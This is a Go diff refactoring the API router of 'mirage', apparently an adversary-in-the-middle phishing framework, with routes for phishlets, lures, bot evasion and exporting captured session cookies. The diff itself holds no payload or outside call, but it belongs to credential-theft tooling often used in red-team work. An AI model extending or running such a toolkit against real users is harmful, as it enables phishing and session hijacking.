@@ -9,6 +9,7 @@ import (
 
 	"github.com/travisbale/mirage/internal/aitm"
 	"github.com/travisbale/mirage/internal/store"
+	"github.com/travisbale/mirage/sdk"
 )
 
 // --- Local interfaces ---
@@ -112,56 +113,59 @@ func (r *Router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 
 func (r *Router) registerRoutes() {
 	auth := r.authMiddleware
+	h := func(method, route string, handler http.HandlerFunc) {
+		r.mux.HandleFunc(method+" "+route, auth(handler))
+	}
 
 	// Sessions
-	r.mux.HandleFunc("GET /api/sessions/stream", auth(r.streamSessions))
-	r.mux.HandleFunc("GET /api/sessions/{id}/export", auth(r.exportSessionCookies))
-	r.mux.HandleFunc("GET /api/sessions/{id}", auth(r.getSession))
-	r.mux.HandleFunc("DELETE /api/sessions/{id}", auth(r.deleteSession))
-	r.mux.HandleFunc("GET /api/sessions", auth(r.listSessions))
+	h("GET", sdk.RouteSessionsStream, r.streamSessions)
+	h("GET", sdk.RouteSessionExport, r.exportSessionCookies)
+	h("GET", sdk.RouteSession, r.getSession)
+	h("DELETE", sdk.RouteSession, r.deleteSession)
+	h("GET", sdk.RouteSessions, r.listSessions)
 
 	// Lures
-	r.mux.HandleFunc("GET /api/lures", auth(r.listLures))
-	r.mux.HandleFunc("POST /api/lures", auth(r.createLure))
-	r.mux.HandleFunc("PATCH /api/lures/{id}", auth(r.updateLure))
-	r.mux.HandleFunc("DELETE /api/lures/{id}", auth(r.deleteLure))
-	r.mux.HandleFunc("POST /api/lures/{id}/url", auth(r.generateLureURL))
-	r.mux.HandleFunc("POST /api/lures/{id}/pause", auth(r.pauseLure))
-	r.mux.HandleFunc("DELETE /api/lures/{id}/pause", auth(r.unpauseLure))
+	h("GET", sdk.RouteLures, r.listLures)
+	h("POST", sdk.RouteLures, r.createLure)
+	h("PATCH", sdk.RouteLure, r.updateLure)
+	h("DELETE", sdk.RouteLure, r.deleteLure)
+	h("POST", sdk.RouteLureURL, r.generateLureURL)
+	h("POST", sdk.RouteLurePause, r.pauseLure)
+	h("DELETE", sdk.RouteLurePause, r.unpauseLure)
 
 	// Phishlets
-	r.mux.HandleFunc("GET /api/phishlets/registry", auth(r.listRegistry))
-	r.mux.HandleFunc("GET /api/phishlets/{name}/hosts", auth(r.getPhishletHosts))
-	r.mux.HandleFunc("POST /api/phishlets/{name}/enable", auth(r.enablePhishlet))
-	r.mux.HandleFunc("POST /api/phishlets/{name}/disable", auth(r.disablePhishlet))
-	r.mux.HandleFunc("POST /api/phishlets/{name}/hide", auth(r.hidePhishlet))
-	r.mux.HandleFunc("POST /api/phishlets/{name}/unhide", auth(r.unhidePhishlet))
-	r.mux.HandleFunc("DELETE /api/phishlets/{name}", auth(r.deleteSubPhishlet))
-	r.mux.HandleFunc("GET /api/phishlets", auth(r.listPhishlets))
-	r.mux.HandleFunc("POST /api/phishlets", auth(r.createSubPhishlet))
+	h("GET", sdk.RoutePhishletRegistry, r.listRegistry)
+	h("GET", sdk.RoutePhishletHosts, r.getPhishletHosts)
+	h("POST", sdk.RoutePhishletEnable, r.enablePhishlet)
+	h("POST", sdk.RoutePhishletDisable, r.disablePhishlet)
+	h("POST", sdk.RoutePhishletHide, r.hidePhishlet)
+	h("POST", sdk.RoutePhishletUnhide, r.unhidePhishlet)
+	h("DELETE", sdk.RoutePhishlet, r.deleteSubPhishlet)
+	h("GET", sdk.RoutePhishlets, r.listPhishlets)
+	h("POST", sdk.RoutePhishlets, r.createSubPhishlet)
 
 	// Blacklist
-	r.mux.HandleFunc("GET /api/blacklist", auth(r.listBlacklist))
-	r.mux.HandleFunc("POST /api/blacklist", auth(r.addBlacklistEntry))
-	r.mux.HandleFunc("DELETE /api/blacklist/{entry}", auth(r.removeBlacklistEntry))
+	h("GET", sdk.RouteBlacklist, r.listBlacklist)
+	h("POST", sdk.RouteBlacklist, r.addBlacklistEntry)
+	h("DELETE", sdk.RouteBlacklistEntry, r.removeBlacklistEntry)
 
 	// DNS
-	r.mux.HandleFunc("GET /api/dns/zones", auth(r.listDNSZones))
-	r.mux.HandleFunc("POST /api/dns/sync", auth(r.syncDNS))
+	h("GET", sdk.RouteDNSZones, r.listDNSZones)
+	h("POST", sdk.RouteDNSSync, r.syncDNS)
 
 	// BotGuard
-	r.mux.HandleFunc("GET /api/botguard/signatures", auth(r.listBotSignatures))
-	r.mux.HandleFunc("POST /api/botguard/signatures", auth(r.addBotSignature))
-	r.mux.HandleFunc("DELETE /api/botguard/signatures/{hash}", auth(r.removeBotSignature))
-	r.mux.HandleFunc("PATCH /api/botguard/threshold", auth(r.updateBotThreshold))
+	h("GET", sdk.RouteBotSignatures, r.listBotSignatures)
+	h("POST", sdk.RouteBotSignatures, r.addBotSignature)
+	h("DELETE", sdk.RouteBotSignature, r.removeBotSignature)
+	h("PATCH", sdk.RouteBotThreshold, r.updateBotThreshold)
 
 	// System
-	r.mux.HandleFunc("GET /api/status", auth(r.getStatus))
-	r.mux.HandleFunc("POST /api/reload", auth(r.reload))
+	h("GET", sdk.RouteStatus, r.getStatus)
+	h("POST", sdk.RouteReload, r.reload)
 
 	// Campaigns
-	r.mux.HandleFunc("GET /api/campaigns", auth(r.listCampaignMappings))
-	r.mux.HandleFunc("POST /api/campaigns/sync", auth(r.syncCampaign))
+	h("GET", sdk.RouteCampaigns, r.listCampaignMappings)
+	h("POST", sdk.RouteCampaignSync, r.syncCampaign)
 }
 
 // --- Helpers ---
@@ -173,7 +177,7 @@ func writeJSON(w http.ResponseWriter, status int, v any) {
 }
 
 func writeError(w http.ResponseWriter, status int, message, code string) {
-	writeJSON(w, status, ErrorResponse{Error: message, Code: code})
+	writeJSON(w, status, sdk.ErrorResponse{Error: message, Code: code})
 }
 
 func parsePagination(req *http.Request) (limit, offset int) {
